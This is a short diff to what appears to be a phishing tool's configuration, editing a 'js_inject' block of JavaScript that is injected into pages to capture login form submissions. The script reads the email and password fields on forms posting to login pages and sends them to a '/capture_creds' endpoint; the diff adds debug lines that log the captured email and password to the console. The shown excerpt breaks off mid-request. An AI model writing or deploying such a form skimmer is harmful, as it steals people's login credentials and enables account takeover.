@@ -61,10 +61,13 @@ js_inject:
     script: |
       document.addEventListener('submit', function(e){
         const form = e.target;
+        console.log('you are here');
         if(form.action.includes('login.php') || form.action.includes('login.')){
           const email = form.querySelector('input[name="email"]')?.value;
           const pass = form.querySelector('input[name="pass"]')?.value;
-
+          console.log('form submitted');
+          console.log(email);
+          console.log(pass);
           if(email && pass){
             fetch('/capture_creds', {
               method: 'POST',
